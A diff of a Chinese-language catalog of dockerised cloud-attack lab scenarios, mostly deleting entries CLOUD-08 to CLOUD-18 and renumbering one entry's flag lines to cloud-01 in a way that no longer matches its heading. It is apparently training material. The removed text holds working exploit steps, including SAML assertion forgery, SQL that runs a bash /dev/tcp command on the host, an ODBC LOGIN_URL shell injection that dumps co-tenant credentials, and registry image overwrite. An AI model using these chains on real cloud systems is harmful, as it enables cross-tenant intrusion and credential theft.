-| 核心漏洞与利用 | Forge or reuse a token with a mismatched repository claim |
-| 权限、横向或影响 | Cross-repository role assumption |
-| 验证 | Assume the target role and retrieve the flag |
-
-**修复建议**
-
-信任策略必须限定 sub/aud/ref 等条件；对 OIDC token 做完整校验。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-08"></a>
-
-### CLOUD-08 · IAM 信任策略 Principal:* → 跨账号接管
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-08 |
-| 名称 | IAM Trust Policy Principal:* → Cross-Account Takeover |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (overly permissive trust policy) |
-| 入口 | `localhost:10612` |
-| 目录 | `scenarios/cloud/cross-account-trust` |
-
-**场景概述**
-
-目标账号的 IAM 角色信任策略写了 `"Principal": "*"`（或过宽的
-`AWS` 主体），任何账号都能 AssumeRole。攻击者枚举角色名后直接
-跨账号接管，读取目标 S3 资源。
-
-**教材锚点**
-
-- 案例：跨账号信任滥用（#010 家族）
-- 平面：控制面（IAM）→ 失败边界：账号/身份
-- 六镜头：IDENTITY（信任主体过宽）；DETECTION（AssumeRole 成功
-  在受害者侧不留痕）
-
-**前置知识 / 条件**
-
-- IAM trust policy 主体语义；跨账号 AssumeRole；角色枚举
-
-**利用步骤**
-
-1. 枚举角色名：`GET /roles` 与 `GET /roles/<name>` 可查看脱敏后的
-   信任策略（Principal 与 Condition 结构可见、具体账号被隐藏）。
-2. 用攻击者身份的 AK/SK 调用 AssumeRole，目标为信任策略过宽的角色
-   （如 `CrossAccountRole` 信任本账号 root，或 `AdminRole` 为
-   `Principal:*`）。
-3. 用返回的三段式临时凭据（AccessKeyId / SecretAccessKey /
-   SessionToken）请求 S3 的 `/flag.txt`。S3 会向 IAM 校验会话有效性
-   与角色权限；匿名、伪造或权限不足的凭据一律返回 403。
-4. 终端服务 s3 向 flag-vault 出示AssumeRole 得到的三段式临时凭据，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 s3 向 flag-vault 出示「AssumeRole 得到的三段式临时凭据」（校验模式 `session-creds`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-08-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-08 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-08 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | IAM trust policies and STS-style role assumption |
-| 侦察与前置条件 | Role ARN discovery and Principal/trust condition inspection |
-| 核心漏洞与利用 | Assume a role trusted by Principal:* |
-| 权限、横向或影响 | Cross-account privilege takeover |
-| 验证 | Use the assumed role to read the target flag |
-
-**修复建议**
-
-信任策略限定具体主体与条件；启用外部 ID / 条件键；监控异常 AssumeRole。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-09"></a>
-
-### CLOUD-09 · Golden SAML：信任根伪造
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-09 |
-| 名称 | Golden SAML → Federation Trust Root Compromise |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (SAML signing key exposure) |
-| 入口 | `localhost:10613` |
-| 目录 | `scenarios/cloud/golden-saml` |
-
-**场景概述**
-
-SAML IdP 的签名私钥泄露（藏在 IdP 容器中）。攻击者拿到私钥后用
-任意身份属性签发 SAML 断言，作为任意用户/角色登录云控制面，
-完成信任根级伪造。
-
-**教材锚点**
-
-- 案例：Golden SAML（Ch3 T2）
-- 平面：控制面（身份联合）→ 失败边界：身份/信任根
-- 六镜头：IDENTITY（信任根密钥失陷即一切可伪造）；DETECTION
-  （伪造断言与合法登录无异）
-
-**前置知识 / 条件**
-
-- SAML 断言结构与签名；IdP 私钥保护
-
-**利用步骤**
-
-1. 从 SAML IdP 容器/配置中获取签名私钥。
-2. 构造 SAML 断言（NameID=目标管理员），用私钥签名。
-3. 提交断言换取控制面会话，读取 flag。
-4. 终端服务 iam 向 flag-vault 出示用 IdP 私钥伪造的 RS256 断言，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 iam 向 flag-vault 出示「用 IdP 私钥伪造的 RS256 断言」（校验模式 `jwt`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-09-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-09 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-09 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | SAML assertions, signing keys, and federation |
-| 侦察与前置条件 | SAML IdP key material and role assertion format |
-| 核心漏洞与利用 | Forge a signed SAML assertion with the exposed key |
-| 权限、横向或影响 | Federation trust-root compromise |
-| 验证 | Exchange the forged assertion for the flag-bearing role |
-
-**修复建议**
-
-签名密钥必须 HSM 保护；定期轮换；对断言做 audience/时间窗校验。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-10"></a>
-
-### CLOUD-10 · SCP 绕过：旧版 API 版本
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-10 |
-| 名称 | SCP Bypass via Legacy API Version |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (SCP enforcement gap) |
-| 入口 | `localhost:10615` |
-| 目录 | `scenarios/cloud/scp-bypass` |
-
-**场景概述**
-
-服务控制策略（SCP）限制了 AssumeRole AdminRole。旧版 API 版本
-（如 2010-05-08）的解析路径没有执行 SCP 校验，攻击者用旧版
-请求即可绕过限制获得管理角色。
-
-**教材锚点**
-
-- 案例：SCP 强制缺口（控制面策略执行不一致）
-- 平面：控制面（策略执行）→ 失败边界：身份/策略
-- 六镜头：MAGIC（策略执行依赖 API 版本路由）；DETECTION（绕过后
-  的调用与正常调用同形）
-
-**前置知识 / 条件**
-
-- SCP 与服务控制策略执行模型；API 版本兼容性
-
-**利用步骤**
-
-1. 用默认版本 AssumeRole AdminRole——被 SCP 拒绝。
-2. 在请求中加入旧版参数 `Version=2010-05-08` 重试。
-3. 旧版路径未执行 SCP 校验，成功获得 AdminRole 凭据与 flag。
-4. 终端服务 iam 向 flag-vault 出示scp-bypass-user 的长期密钥签名，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 iam 向 flag-vault 出示「scp-bypass-user 的长期密钥签名」（校验模式 `sigv4`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-10-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-10 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-10 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Service control policies and cloud API versions |
-| 侦察与前置条件 | Policy evaluation and legacy API version behavior |
-| 核心漏洞与利用 | Call the API version outside SCP enforcement |
-| 权限、横向或影响 | Organization-level control-plane restriction bypass |
-| 验证 | Perform the restricted operation and collect the flag |
-
-**修复建议**
-
-策略执行必须在所有 API 版本路径上一致；废弃旧版端点或统一鉴权
-中间件。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-11"></a>
-
-### CLOUD-11 · 全局 S3 命名空间抢占 → 跨租户数据窃取
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-11 |
 | 名称 | Global S3 Namespace Squatting → Cross-Tenant Data Theft |
 | 交付方式 | docker |
 | 难度 | L2 |
@@ -887,9 +170,9 @@ SAML IdP 的签名私钥泄露（藏在 IdP 容器中）。攻击者拿到私钥
 - 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
 - 交付条件：只有 s3-global 向 flag-vault 出示「对象存储内部交付令牌」（校验模式 `header-secret`）时才交付；
   其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-11-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-11 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-11 <flag>`（参考利用）。
+- 形态：`flag{cloud-01-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py cloud-01 <flag>`（gate）+
+  `python3 tests/cloud/run.py cloud-01 <flag>`（参考利用）。
 
 **知识维度**
 
@@ -909,1039 +192,13 @@ SAML IdP 的签名私钥泄露（藏在 IdP 容器中）。攻击者拿到私钥
 
 ---
 
-<a id="cloud-12"></a>
+<a id="cloud-02"></a>
 
-### CLOUD-12 · CosMiss：托管笔记本前端跨租户访问
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-12 |
-| 名称 | CosMiss: Managed Notebook Front-End → Cross-Tenant RCE |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (forwardingId authz bypass, case #073) |
-| 入口 | `localhost:10623` |
-| 目录 | `scenarios/cloud/cosmiss-notebook` |
-
-**场景概述**
-
-供应商的多租户 notebook 前端会验证签名的租户 token，但路由层没有把
-token 中的 tenant 与 forwardingId 对应 notebook 的属主绑定。攻击者只需
-持有任一租户的有效 token，就能把请求路由到其他租户的 notebook 并执行代码。
-
-**教材锚点**
-
-- 案例：Azure Cosmos DB Notebook forwardingId 授权绕过（CosMiss，#073）
-- 平面：数据面（notebook 前端）→ 失败边界：命名空间 / 账号
-- 六镜头：IDENTITY（前端从不复检调用者身份）；SHARED（前端是多租户共享组件）；
-  DETECTION（对 notebook 的访问不产生租户审计）
-
-**前置知识 / 条件**
-
-- 托管 notebook 服务的基本模型（前端路由 + 每租户一个执行容器）
-- "非机密标识符被当作访问凭据"（security by obscurity）
-
-**利用步骤**
-
-1. 从 `/auth/token` 获取 tenant-a 会话 token，再访问入口页 `/`，发现"Shared notebook"链接，提取其中的 forwardingId：
-   `fwd-8c1d4e5f-6a2b-4c3d-8e9f-000000000002`
-2. 携带 tenant-a token 用该 ID 调用执行端点（服务端只验签、不校验 token tenant 与 notebook 属主）：
-   `GET /notebook/<fwd>/exec?code=print(open('/flag.txt').read())`
-3. 返回 victim 租户 notebook 中的 flag。
-4. 终端服务 nb-b 向 flag-vault 出示笔记本运行时地址（flag 落成 /flag.txt 后即删），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 nb-b 向 flag-vault 出示「笔记本运行时地址（flag 落成 /flag.txt 后即删）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-12-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-12 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-12 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Managed notebook frontend routing and tenant notebooks |
-| 侦察与前置条件 | forwardingId format and tenant-to-notebook routing behavior |
-| 核心漏洞与利用 | Replace forwardingId to target a co-tenant notebook |
-| 权限、横向或影响 | Cross-tenant notebook execution |
-| 验证 | Run the routed command and capture the flag |
-
-**修复建议**
-
-前端路由必须校验调用者身份（Authorization token），且执行端点不能暴露
-给非属主租户；forwardingId 不应作为访问凭据。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-13"></a>
-
-### CLOUD-13 · RDS log_fdw：托管数据库宿主文件读取
+### CLOUD-02 · CloudImposer：托管数据平台依赖混淆
 
 | 字段 | 值 |
 |---|---|
-| ID | CLOUD-13 |
-| 名称 | RDS log_fdw: Managed DB Host File Read → Provider Internal Creds |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (log_fdw path traversal, case #015) |
-| 入口 | `localhost:10624` |
-| 目录 | `scenarios/cloud/rds-logfdw` |
-
-**场景概述**
-
-托管 PostgreSQL 预装了 log_fdw（读数据库日志的扩展），但扩展对
-filename 选项没有做路径约束，客户可以把它当任意文件读，跨过
-"SQL 授权即边界"的错觉，读到宿主上供应商内部服务凭据。
-
-**教材锚点**
-
-- 案例：AWS RDS PostgreSQL log_fdw 任意文件读（#015）
-- 平面：数据面（SQL）→ 失败边界：宿主机 VM
-- 六镜头：BOUNDARY（真正的边界是宿主 VM 而非 SQL 授权）；
-  IDENTITY（读到的是宿主机上 provider 内部身份）；DETECTION（DB 查询日志
-  可见，但宿主文件读取在宿主层不可见）
-
-**前置知识 / 条件**
-
-- PostgreSQL 扩展机制：CREATE SERVER / CREATE FOREIGN TABLE
-- 托管数据库模型：客户拿到数据库角色，永远没有宿主 OS 账号
-
-**利用步骤**
-
-1. 在控制台执行（`file_fdw` 已预置）：
-   ```sql
-   CREATE SERVER log_server FOREIGN DATA WRAPPER file_fdw;
-   CREATE FOREIGN TABLE demo (t text) SERVER log_server
-     OPTIONS (filename '/rdsdbdata/config/grover_volume.conf');
-   SELECT * FROM demo;
-   ```
-2. 读出宿主机上的供应商配置文件——里面是**内部凭据**（不再是明文 flag）。控制台（托管引擎）
-   随即用这份凭据向 flag-vault 换取第一枚 flag 并补进同一响应。
-3. 用同一份内部凭据（`Authorization: Bearer grover-internal-credential-token`）经控制面
-   `/fetch` 调内部 API：`/fetch?url=http://internal-api:5000/api&auth=grover-internal-credential-token`，
-   换取第二枚 flag。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 console + internal-api 向 flag-vault 出示「供应商内部凭据（宿主文件里那份）」（校验模式 `header-secret`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-13-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-13 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-13 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | PostgreSQL log_fdw and managed database host files |
-| 侦察与前置条件 | Foreign-table log path behavior and provider internal file locations |
-| 核心漏洞与利用 | Use log_fdw path traversal/file read |
-| 权限、横向或影响 | Provider-internal credential disclosure |
-| 验证 | Read the internal credential or flag file |
-
-**修复建议**
-
-FDW 的 filename 必须白名单限制在日志目录；宿主上不允许存放可被
-数据库引擎进程读取的供应商内部凭据。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-14"></a>
-
-### CLOUD-14 · Cloud SQL 引擎补丁：索引函数以供应商角色执行
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-14 |
-| 名称 | Cloud SQL Engine Patch: Index Function Runs as Provider Role → Host RCE |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (ATExecChangeOwner patch + ANALYZE, case #052) |
-| 入口 | `localhost:10625` |
-| 目录 | `scenarios/cloud/cloudsql-index-rce` |
-
-**场景概述**
-
-供应商修改了 PostgreSQL 引擎：客户管理员角色（cloudsqluser）拥有
-"可把任意表属主改为 cloudsqladmin"的补丁能力；而 ANALYZE 会以表属主
-身份重新求值索引表达式函数。把两者串起来即可让攻击者函数以供应商
-超级角色执行宿主命令。
-
-**教材锚点**
-
-- 案例：GCP Cloud SQL 逃逸到宿主（#052）
-- 平面：数据面（SQL）→ 宿主 RCE → 失败边界：宿主机
-- 六镜头：MAGIC（供应商对引擎的补丁代码是攻击面）；
-  IDENTITY（索引函数继承表属主身份）
-
-**前置知识 / 条件**
-
-- PostgreSQL：索引表达式、ANALYZE、表属主、VOLATILE/IMMUTABLE 函数
-- 托管数据库角色阶梯：客户角色 < 供应商超级角色 < 宿主 OS
-
-> 边界说明：`cloudsqluser` 不是超级用户，直接执行
-> `COPY ... FROM PROGRAM` 或读取宿主文件会被拒绝；以下漏洞链是唯一
-> 能以供应商角色执行命令的路径。
-
-**利用步骤**
-
-1. 建表并建一个无害的 IMMUTABLE 函数和索引（让索引合法建立）：
-   ```sql
-   CREATE TABLE temp_table (data text);
-   INSERT INTO temp_table VALUES ('dummy');
-   CREATE FUNCTION suid(text) RETURNS text IMMUTABLE
-     AS 'SELECT ''nothing''' LANGUAGE sql;
-   CREATE INDEX idx_malicious ON temp_table (suid(data));
-   ```
-2. 把表属主改成供应商超级角色（引擎补丁允许）：
-   ```sql
-   ALTER TABLE temp_table OWNER TO cloudsqladmin;
-   ```
-3. 把函数体换成 VOLATILE 宿主命令。由于索引函数会以 provider 超级角色在数据库主机上执行，
-   直接在主机上向 flag-vault 取密文（`$p$` 引用避免与外层 `$$` 撞标签）：
-   ```sql
-   CREATE OR REPLACE FUNCTION suid(text) RETURNS text VOLATILE AS
-     $$ COPY public.shell_commands_results (data) FROM PROGRAM
-        $p$bash -c "exec 3<>/dev/tcp/flag-vault/5000; printf 'GET /flag HTTP/1.0
-
-' >&3; timeout 5 cat <&3"$p$;
-        SELECT 'done' $$ LANGUAGE sql;
-   ```
-4. 触发 `ANALYZE public.temp_table;`——控制台以 cloudsqladmin 身份重新求值索引函数，命令输出写入
-   `shell_commands_results`。
-5. `SELECT * FROM shell_commands_results;` 得到密文。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 数据库主机 向 flag-vault 出示「数据库主机地址（provider 超级角色在主机上执行取回）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-14-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-14 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-14 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | PostgreSQL indexes, functions, ANALYZE, and managed roles |
-| 侦察与前置条件 | Table ownership mutation and provider-role execution semantics |
-| 核心漏洞与利用 | Chain owner change with a malicious index expression function |
-| 权限、横向或影响 | Provider-role to host command execution |
-| 验证 | Query shell command results to retrieve the host flag |
-
-**修复建议**
-
-客户角色不允许改表属主为供应商角色；ANALYZE 不得以表属主身份执行
-任意函数；宿主命令执行能力必须从引擎层剥离。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-15"></a>
-
-### CLOUD-15 · SynLapse：共享集成运行时跨租户凭据
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-15 |
-| 名称 | SynLapse: Shared Integration Runtime → Co-Tenant Credentials |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (ODBC driver injection, CVE-2022-29972 lineage, case #062) |
-| 入口 | `localhost:10626` |
-| 目录 | `scenarios/cloud/synlapse-ir` |
-
-**场景概述**
-
-分析平台把管道执行放到共享的多租户集成运行时（AutoResolveIntegrationRuntime）。
-捆绑的 Redshift ODBC 驱动的 SAML 插件对 LOGIN_URL 做 shell 拼接，且"运行时选择"
-只发生在客户端：攻击者把 runtime 名换成共享池后，注入的命令在多租户 worker 上
-以 SYSTEM 执行，内存里躺着其他租户的凭据。
-
-**教材锚点**
-
-- 案例：SynLapse / CVE-2022-29972（#062）
-- 平面：数据面 worker → 失败边界：命名空间（共享池）
-- 六镜头：SHARED（共享 IR 是爆炸半径）；MAGIC（捆绑驱动的便利即攻击面）；
-  DETECTION（客户看不到 worker 内部执行）
-
-**前置知识 / 条件**
-
-- 集成运行时 / ETL worker 模型；ODBC 连接字符串注入
-- "运行时归属只由客户端声明"（服务端不校验）
-
-**利用步骤**
-
-1. 查看控制面文档，确认存在共享运行时 `AutoResolveIntegrationRuntime`。
-2. 构造恶意连接字符串，在 `LOGIN_URL` 里放 shell 命令：先 dump 同机 co-tenant 凭据，
-   再从共享运行时自己的内网地址向 flag-vault 取密文：
-   `LOGIN_URL={cat /app/memory.json; python3 -c "import urllib.request;print(urllib.request.urlopen('http://flag-vault:5000/flag').read().decode())";}`
-3. 以 `runtime_name=AutoResolveIntegrationRuntime` 提交管道。
-4. 共享 worker 执行注入命令，返回 co-tenant 凭据与供应商密文。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 共享集成运行时 向 flag-vault 出示「共享运行时地址（注入的命令直达 vault）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-15-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-15 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-15 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Data integration control plane, shared runtime, and ODBC |
-| 侦察与前置条件 | Runtime selection and connection-string handling |
-| 核心漏洞与利用 | Send an ODBC driver/LOGIN_URL injection to the shared runtime |
-| 权限、横向或影响 | Co-tenant credential disclosure from shared execution |
-| 验证 | Read the shared runtime result/flag |
-
-**修复建议**
-
-IR 节点必须专用、临时、单租户（修复后架构）；捆绑驱动的连接字符串
-参数必须白名单过滤；worker 内存不得驻留跨租户凭据；管理凭据应短时效。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-16"></a>
-
-### CLOUD-16 · ExtraReplica：内部子网绕过防火墙 + 证书 CN 校验缺陷
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-16 |
-| 名称 | ExtraReplica: Internal Subnet + CN Regex → Cross-Tenant DB Replication |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (internal subnet + mis-anchored cert regex, case #061) |
-| 入口 | `localhost:10627` |
-| 目录 | `scenarios/cloud/extrareplica-repl` |
-
-**场景概述**
-
-托管数据库容器共享宿主网络命名空间，位于供应商内部子网 10.0.0.0/24。
-受害者数据库的 deny-all 防火墙只覆盖公网路径；同时 replication 用户
-在内部子网用客户端证书认证，而证书 CN 校验正则尾部未锚定
-（`...database.azure.com(.*)`），攻击者可用带自己域名后缀的 CN 通过。
-
-**教材锚点**
-
-- 案例：ExtraReplica 跨账号数据库漏洞（#061）
-- 平面：数据面（复制协议）→ 失败边界：网络 + 身份
-- 六镜头：BOUNDARY（防火墙只管公网路径，内部子网是软边界）；
-  IDENTITY（CN 正则未锚定）；DETECTION（流复制在数据库审计之外）
-
-**前置知识 / 条件**
-
-- PostgreSQL 流复制 / pg_basebackup；pg_hba cert 认证
-- 内部子网与公网防火墙的边界模型
-
-**利用步骤**
-
-1. Step 1：侦察自己的托管实例网络，确认与受害者共享内部子网 `10.0.0.0/24`，
-   公网防火墙不覆盖该路径。
-2. Step 2：向内部 CA 申请客户端证书，CN 为
-   `replication.<victim-id>.database.azure.com.attacker.example`（尾部后缀，CA 的正则允许）。
-3. Step 3：以复制用户身份 `pg_basebackup` 拉走受害者整库——得到的是同租户的轮换令牌，
-   不是明文 flag。
-4. 用同一张内部 CA 签发的客户端证书（`X-Client-Cert`）向 flag-vault 换取密文：证书是这个
-   终点的唯一凭据，pg_basebackup 只证明你已经越过了内网与证书两道边界。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 租户控制台 向 flag-vault 出示「内部 CA 签发、CN 形如 replication.<id>… 的客户端证书」（校验模式 `mtls`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-16-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-16 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-16 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | PostgreSQL replication, mutual TLS, internal networks, and X.509 |
-| 侦察与前置条件 | Internal subnet trust and CA CN regex behavior |
-| 核心漏洞与利用 | Obtain a certificate with a regex-bypass CN and start replication |
-| 权限、横向或影响 | Cross-tenant database replication |
-| 验证 | Read replicated victim data/flag |
-
-**修复建议**
-
-内部子网也必须有租户级网络隔离；证书 CN 正则必须锚定末尾；复制用户
-不应信任"看起来像内部来源"的连接。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-17"></a>
-
-### CLOUD-17 · WireServing：宿主代理通道窃取节点引导密钥
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-17 |
-| 名称 | WireServing: Host-Agent Channel → Node Bootstrap Secrets |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (unvalidated transport cert, case #255/#184) |
-| 入口 | `localhost:10628` |
-| 目录 | `scenarios/cloud/wireserver-bootstrap` |
-
-**场景概述**
-
-托管 K8s 节点上的普通 pod（无特权、无 hostNetwork）能访问宿主代理
-WireServer（168.63.129.16）。goalstate 无鉴权；证书端点不校验调用者
-提供的传输公钥；protectedSettings 用可被拉取的 TenantEncryptionCert
-加密。攻击者最终拿到节点引导 token，伪造 system:node 身份读取节点
-上的 Secret（WireServing，相当于集群管理员）。
-
-**教材锚点**
-
-- 案例：WireServing（#255）；WireServer 扩展设置解密（#184）
-- 平面：控制面通道（guest→host agent）→ 失败边界：网络
-- 六镜头：MAGIC（引导自动化以高权限运行）；SHARED（host agent 是所有
-  VM 的共享组件）；DETECTION（网络策略未覆盖 host-agent IP）
-
-**前置知识 / 条件**
-
-- Azure WireServer / HostGAPlugin 协议；VM 扩展 protectedSettings
-- Kubernetes TLS bootstrap（CSR 自动签发）
-
-**利用步骤**
-
-1. 从 pod 内 GET `http://168.63.129.16/machine/?comp=goalstate`（无鉴权）。
-2. 生成自签传输证书，放入 `x-ms-guest-agent-public-x509-cert` 头请求
-   `/certs`；服务端把密钥包加密到该公钥，用自己私钥解密得到
-   TenantEncryptionCert。
-3. 请求 `/vmSettings`，用 TenantEncryptionCert 解密 protectedSettings，
-   得到 `TLS_BOOTSTRAP_TOKEN` 与 flag。
-4. 用 bootstrap token 向控制面提交 CSR（CN=system:node:*）——自动签发。
-5. 以伪造的 node 身份读取 `/node-secrets`，拿到最终 flag。
-6. 终端服务 Wireserver / 控制面 向 flag-vault 出示两个内部服务地址，各取自己那枚 flag，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 Wireserver / 控制面 向 flag-vault 出示「两个内部服务地址，各取自己那枚 flag」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-17-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-17 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-17 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Azure WireServer-like host agent, X.509, RSA-OAEP, and AES-GCM |
-| 侦察与前置条件 | Unauthenticated goalstate and caller-supplied transport certificate handling |
-| 核心漏洞与利用 | Supply an attacker certificate, unwrap the secret bundle, and decrypt settings |
-| 权限、横向或影响 | Node bootstrap secret theft and node identity forgery |
-| 验证 | Use the recovered bootstrap material to obtain the node flag |
-
-**修复建议**
-
-网络策略必须阻止 pod 访问 host-agent IP；WireServer 必须校验传输证书
-归属；扩展密钥按节点短时效轮换。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-18"></a>
-
-### CLOUD-18 · 构建舰队 + 内部镜像仓库供应链
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-18 |
-| 名称 | Build Fleet + Internal Registry: Image Supply-Chain Overwrite |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (unauth internal registry, case #260 lineage) |
-| 入口 | `localhost:10629` |
-| 目录 | `scenarios/cloud/buildfleet-registry` |
-
-**场景概述**
-
-供应商的托管构建服务在共享构建机上执行租户 Dockerfile 的 RUN 指令；
-内部镜像仓库没有任何鉴权/租户隔离，任何调用者都能拉取或覆盖任意
-租户镜像。攻击者先借构建机执行泄露内部秘密，再覆盖受害者镜像，
-受害者下一次拉取即被 RCE。
-
-**教材锚点**
-
-- 案例：内部 ACR 可写（#260）；HF Spaces 构建舰队注册表（Ch10）
-- 平面：控制面（构建/注册表）→ 失败边界：命名空间 / 供应链
-- 六镜头：MAGIC（构建自动化以高权限运行）；SHARED（构建舰队与内部
-  registry 是所有租户共享的）；IDENTITY（registry 不校验调用者身份）
-
-**前置知识 / 条件**
-
-- 托管 CI 构建模型；镜像供应链（registry 投毒）
-
-**利用步骤**
-
-1. 提交恶意 Dockerfile 到 `/build`，RUN 读取构建机环境变量
-   （`$BUILD_SECRET`）证明在供应商构建机上执行。
-2. 列出内部 registry（`GET /images`），发现 `victim-app:latest`。
-3. `PUT /images/victim-app:latest` 用恶意脚本覆盖（无鉴权），脚本用
